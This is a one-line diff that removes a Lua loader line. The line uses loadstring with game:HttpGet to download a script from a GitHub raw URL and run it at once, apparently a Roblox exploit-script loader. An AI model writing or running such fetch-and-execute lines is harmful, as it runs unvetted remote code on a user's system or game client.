@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HeiKe2022/wz-v1.5/main/wz-v1.5.lua"))()
